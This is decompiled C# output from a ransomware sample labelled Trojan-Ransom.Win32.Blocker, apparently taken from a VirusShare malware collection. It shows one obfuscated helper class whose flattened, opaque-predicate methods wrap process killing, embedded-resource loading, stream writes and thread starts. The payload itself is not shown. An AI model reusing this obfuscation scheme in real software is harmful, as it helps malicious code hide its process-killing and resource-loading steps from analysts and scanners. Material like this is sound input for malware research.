// Decompiled with JetBrains decompiler
// Type: .Ⴐ
// Assembly: yzalr14k, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73F4068F-A403-47FB-B5CB-C14B2659D9D3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jvnh-1a7b6e0d12ac2336ab057d2b6e6b7694d384e5bc974736cb0a175e5c77f3e4e4.exe

using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u0002
{
  internal sealed class Ⴐ
  {
    internal static Color Ⴍ([In] int obj0, [In] int obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_3:
      int num1;
      switch (obj5 ^ obj4)
      {
        case 87:
          num1 = 3;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 2;
            continue;
          case 2:
          case 4:
            goto label_3;
          case 3:
          case 5:
            goto label_8;
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴍ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return Color.FromArgb(obj0, obj1, obj2, obj3);
    }

    internal static string Ⴗ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 32:
          num1 = 2;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            num2 = 5;
            continue;
          case 1:
          case 3:
            num2 = 5;
            continue;
          case 2:
          case 4:
            goto label_8;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴗ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return Environment.SystemDirectory;
    }

    internal static ParameterInfo[] Ⴅ([In] MethodBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 91:
          num1 = 1;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_8;
          case 2:
          case 4:
            num2 = 6;
            continue;
          case 3:
          case 5:
          case 7:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴅ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.GetParameters();
    }

    internal static string Ⴓ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 114:
          num1 = 0;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_8;
          case 1:
          case 6:
            goto label_3;
          case 2:
          case 5:
            num2 = 6;
            continue;
          case 3:
            num2 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴓ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0 + obj1;
    }

    internal static string[] Ⴀ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 1:
          num1 = 1;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 4:
            goto label_8;
          case 5:
            num2 = 7;
            continue;
          case 6:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴀ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.GetManifestResourceNames();
    }

    internal static Color Ⴈ([In] int obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 93:
          num1 = 6;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 3:
          case 5:
            num2 = 0;
            continue;
          case 4:
            num2 = 0;
            continue;
          case 6:
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴈ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Color.FromArgb(obj0);
    }

    internal static string Ⴐ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 97:
          num1 = 7;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            num2 = 3;
            continue;
          case 2:
          case 7:
            goto label_8;
          case 3:
          case 5:
          case 6:
            goto label_3;
          case 4:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴐ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.Location;
    }

    internal static Process[] Ⴃ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 37:
          num1 = 6;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_3;
          case 1:
            num2 = 0;
            continue;
          case 2:
            num2 = 0;
            continue;
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴃ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Process.GetProcessesByName(obj0);
    }

    internal static DateTime Ⴜ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 10:
          num1 = 3;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
            goto label_3;
          case 3:
          case 7:
            goto label_8;
          case 4:
            num2 = 2;
            continue;
          case 6:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴜ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return DateTime.Now;
    }

    internal static void ႷႭ([In] AppDomain obj0, [In] ResolveEventHandler obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 4:
            num1 = 0;
            continue;
          case 3:
            goto label_8;
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 103:
                num2 = 5;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.ResourceResolve += obj1;
    }

    internal static void ႷႷ([In] Thread obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 1;
            continue;
          case 2:
            goto label_7;
          case 5:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 36:
                num2 = 2;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Start(obj1);
    }

    internal static bool ႷႥ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 115:
          num1 = 7;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 5:
          case 7:
            goto label_8;
          case 2:
            num2 = 3;
            continue;
          case 3:
            goto label_3;
          case 6:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.ႷႥ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.Contains(obj1);
    }

    internal static int ႷႳ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_3:
      int num1;
      switch (obj5 ^ obj4)
      {
        case 46:
          num1 = 1;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_8;
          case 3:
          case 4:
            num2 = 6;
            continue;
          case 5:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.ႷႳ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.Read(obj1, obj2, obj3);
    }

    internal sealed class Ⴄ
    {
      internal static Encoding Ⴓ([In] int obj0, [In] int obj1)
      {
label_3:
        int num1;
        switch (obj1 ^ obj0)
        {
          case 25:
            num1 = 7;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
            case 2:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            case 4:
              num2 = 3;
              continue;
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴄ.Ⴓ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return Encoding.UTF8;
      }

      internal static Decimal Ⴈ([In] Decimal obj0, [In] Decimal obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 28:
            num1 = 4;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 3:
            case 5:
              num2 = 7;
              continue;
            case 4:
              goto label_8;
            case 6:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴄ.Ⴈ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return Decimal.Add(obj0, obj1);
      }

      internal static AppDomain Ⴀ([In] int obj0, [In] int obj1)
      {
label_3:
        int num1;
        switch (obj1 ^ obj0)
        {
          case 117:
            num1 = 0;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_8;
            case 3:
              num2 = 7;
              continue;
            case 4:
            case 6:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴄ.Ⴀ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return AppDomain.CurrentDomain;
      }

      internal static void Ⴃ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
      {
        int num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_8;
            case 1:
            case 2:
              num1 = 5;
              continue;
            case 3:
            case 4:
              goto label_7;
            default:
              int num2;
              switch (obj5 ^ obj4)
              {
                case 49:
                  num2 = 3;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Write(obj1, obj2, obj3);
      }

      internal static string Ⴐ([In] Encoding obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 50:
            num1 = 6;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              num2 = 3;
              continue;
            case 1:
            case 7:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            case 5:
            case 6:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.Ⴐ.Ⴄ.Ⴐ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return obj0.GetString(obj1);
      }

      internal static void Ⴄ([In] Process obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              goto label_7;
            case 1:
              num1 = 4;
              continue;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 22:
                  num2 = 0;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Kill();
      }

      internal static void Ⴅ([In] Thread obj0, [In] ApartmentState obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              num1 = 4;
              continue;
            case 1:
            case 3:
              goto label_7;
            case 5:
              goto label_8;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 55:
                  num2 = 1;
                  break;
                default:
                  num2 = 0;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.SetApartmentState(obj1);
      }

      internal static void Ⴗ(
        [In] Array obj0,
        [In] int obj1,
        [In] Array obj2,
        [In] int obj3,
        [In] int obj4,
        [In] int obj5,
        [In] int obj6)
      {
        int num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 3:
            case 5:
              goto label_7;
            case 4:
              num1 = 1;
              continue;
            default:
              int num2;
              switch (obj6 ^ obj5)
              {
                case 82:
                  num2 = 5;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        Buffer.BlockCopy(obj0, obj1, obj2, obj3, obj4);
      }
    }
  }
}
